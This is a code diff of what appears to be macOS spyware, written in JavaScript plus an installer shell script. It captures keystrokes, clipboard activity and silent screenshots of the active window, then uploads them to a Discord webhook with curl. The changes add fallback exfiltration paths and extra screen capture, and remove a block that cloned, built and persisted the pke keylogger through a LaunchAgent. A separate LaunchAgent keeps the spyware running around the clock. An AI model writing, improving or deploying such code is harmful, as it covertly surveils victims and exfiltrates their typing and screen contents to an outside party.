@@ -773,23 +773,33 @@ function uploadScreenshotToDiscord(filepath, message, callback) {
     }
     
     // Discord webhook supports file uploads via multipart/form-data
-    // Create a temporary JSON payload file
+    // Create a temporary JSON file for payload_json (more reliable than escaping)
     const payloadFile = path.join(screenshotDir, `discord_payload_${Date.now()}.json`);
-    const payload = {
-        content: message
-    };
+    const payload = { content: message };
     
     try {
         fs.writeFileSync(payloadFile, JSON.stringify(payload));
         
         // Upload screenshot + message to Discord using multipart/form-data
-        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath}" "${WEBHOOK}"`, (error, stdout) => {
+        // Use @ for both files (Discord accepts this format)
+        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath};type=image/png" "${WEBHOOK}"`, (error, stdout, stderr) => {
             // Clean up payload file
             setTimeout(() => {
                 try { fs.unlinkSync(payloadFile); } catch (e) {}
             }, 5000);
             
             if (error) {
+                // Fallback: send text only if file upload fails
+                const textPayload = { content: message + '\n\n⚠️ Screenshot upload failed' };
+                const textFile = path.join(screenshotDir, `discord_text_${Date.now()}.json`);
+                try {
+                    fs.writeFileSync(textFile, JSON.stringify(textPayload));
+                    exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
+                        setTimeout(() => {
+                            try { fs.unlinkSync(textFile); } catch (e) {}
+                        }, 5000);
+                    });
+                } catch (e) {}
                 callback(null);
             } else {
                 callback('uploaded');
@@ -885,99 +895,47 @@ setInterval(() => {
                             const height = boundsArray[3] - boundsArray[1];
                             // Capture the window region
                             exec(`screencapture -x -R ${boundsArray[0]},${boundsArray[1]},${width},${height} "${screenshotFile}"`, (screenshotError) => {
-                        if (!screenshotError && fs.existsSync(screenshotFile)) {
-                            // Send with screenshot
-                            sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                            // Clean up screenshot after upload
-                            setTimeout(() => {
-                                try { fs.unlinkSync(screenshotFile); } catch (e) {}
-                            }, 30000);
+                                if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                    // Send with screenshot
+                                    sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                                } else {
+                                    // Send without screenshot if capture failed
+                                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                                }
+                                
+                                // Clear buffer after sending
+                                keysBuffer = '';
+                            });
                         } else {
-                            // Send without screenshot if capture failed
-                            sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                            // Fallback: capture main display
+                            exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                                if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                    sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                                } else {
+                                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                                }
+                                keysBuffer = '';
+                            });
                         }
-                        
-                        // Clear buffer after sending
-                        keysBuffer = '';
-                    });
+                    } else {
+                        // Fallback: capture main display
+                        exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                            if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                            } else {
+                                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                            }
+                            keysBuffer = '';
+                        });
+                    }
                 });
             }
         }
     });
 }, 500); // Check every 500ms
 
-// Method 2: Monitor pke keylogger output if available (captures ACTUAL keystrokes)
-const pkeKeylogFile = '/tmp/keylog.tmp';
-let lastPkeSize = 0;
-
-// Check if pke is installed and running
-setInterval(() => {
-    if (fs.existsSync(pkeKeylogFile)) {
-        try {
-            const stats = fs.statSync(pkeKeylogFile);
-            const currentSize = stats.size;
-            
-            // If file size increased, new keystrokes were captured
-            if (currentSize > lastPkeSize) {
-                const keystrokes = fs.readFileSync(pkeKeylogFile, 'utf8').substring(lastPkeSize);
-                lastPkeSize = currentSize;
-                
-                if (keystrokes && keystrokes.trim().length > 0) {
-                    keysBuffer += keystrokes.substring(0, 5000);
-                    
-                    // Take screenshot of active window when actual typing detected
-                    const timestamp = Date.now();
-                    const screenshotFile = path.join(screenshotDir, `typing_${timestamp}.png`);
-                    
-                    // Get active window bounds and capture it (shows the app/window, not desktop)
-                    exec(`osascript -e 'tell application "System Events" to tell (first process whose frontmost is true) to set windowBounds to bounds of window 1' 2>/dev/null`, (boundsError, bounds) => {
-                        if (!boundsError && bounds && bounds.trim()) {
-                            const boundsArray = bounds.trim().split(', ').map(Number);
-                            if (boundsArray.length === 4) {
-                                const width = boundsArray[2] - boundsArray[0];
-                                const height = boundsArray[3] - boundsArray[1];
-                                // Capture the window region
-                                exec(`screencapture -x -R ${boundsArray[0]},${boundsArray[1]},${width},${height} "${screenshotFile}"`, (screenshotError) => {
-                                    if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
-                                    } else {
-                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
-                                    }
-                                    keysBuffer = '';
-                                });
-                            } else {
-                                // Fallback
-                                exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                                    if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
-                                    } else {
-                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
-                                    }
-                                    keysBuffer = '';
-                                });
-                            }
-                        } else {
-                            // Fallback
-                            exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                                if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                    sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
-                                } else {
-                                    sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
-                                }
-                                keysBuffer = '';
-                            });
-                        }
-                    });
-                }
-            }
-        } catch (e) {
-            // File read error - ignore
-        }
-    } else {
-        // Reset size if file doesn't exist
-        lastPkeSize = 0;
-    }
-}, 1000); // Check every second for pke output
+// REMOVED: pke keylogger monitoring (repository not available)
+// Clipboard monitoring is working and captures copy/paste activity
 
 // REMOVED: Active app monitoring - was causing spam
 
@@ -1022,61 +980,8 @@ PKGEOF
     # Install dependencies (wait for it to complete)
     (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1)
     
-    # Try to install pke keylogger for actual keystroke capture (optional, no sudo needed)
-    # This will capture ACTUAL keystrokes, not just clipboard
-    if command -v git >/dev/null 2>&1 && command -v make >/dev/null 2>&1; then
-        PKE_DIR="/tmp/pke_install_$$"
-        rm -rf "$PKE_DIR" 2>/dev/null
-        mkdir -p "$PKE_DIR"
-        
-        # Clone pke (non-interactive, timeout after 30 seconds)
-        if timeout 30 git clone --quiet https://github.com/paulbeusterien/pke.git "$PKE_DIR" 2>/dev/null; then
-            (cd "$PKE_DIR" && make >/dev/null 2>&1)
-            if [ -f "$PKE_DIR/pke" ]; then
-                # Install to user's local bin (no sudo needed)
-                mkdir -p "$HOME/.local/bin" 2>/dev/null
-                if cp "$PKE_DIR/pke" "$HOME/.local/bin/pke" 2>/dev/null; then
-                    chmod +x "$HOME/.local/bin/pke" 2>/dev/null
-                    # Add to PATH if not already there
-                    if ! echo "$PATH" | grep -q "$HOME/.local/bin"; then
-                        export PATH="$HOME/.local/bin:$PATH"
-                    fi
-                    # Create LaunchAgent for pke (runs as user, no sudo needed)
-                    PKE_AGENT_FILE="$HOME/Library/LaunchAgents/com.pke.keylogger.plist"
-                    cat > "$PKE_AGENT_FILE" << PKEEOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.pke.keylogger</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$HOME/.local/bin/pke</string>
-        <string>-o</string>
-        <string>/tmp/keylog.tmp</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>WorkingDirectory</key>
-    <string>/tmp</string>
-    <key>StandardOutPath</key>
-    <string>/tmp/pke.log</string>
-    <key>StandardErrorPath</key>
-    <string>/tmp/pke.error.log</string>
-</dict>
-</plist>
-PKEEOF
-                    launchctl unload "$PKE_AGENT_FILE" 2>/dev/null
-                    launchctl load "$PKE_AGENT_FILE" 2>/dev/null || true
-                    launchctl start com.pke.keylogger 2>/dev/null || true
-                fi
-            fi
-            rm -rf "$PKE_DIR" 2>/dev/null
-        fi
-    fi
+    # REMOVED: pke keylogger installation (repository not available)
+    # Clipboard monitoring is working and captures copy/paste activity
     
     # Create Launch Agent for 24/7 operation (runs even after terminal closes)
     local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
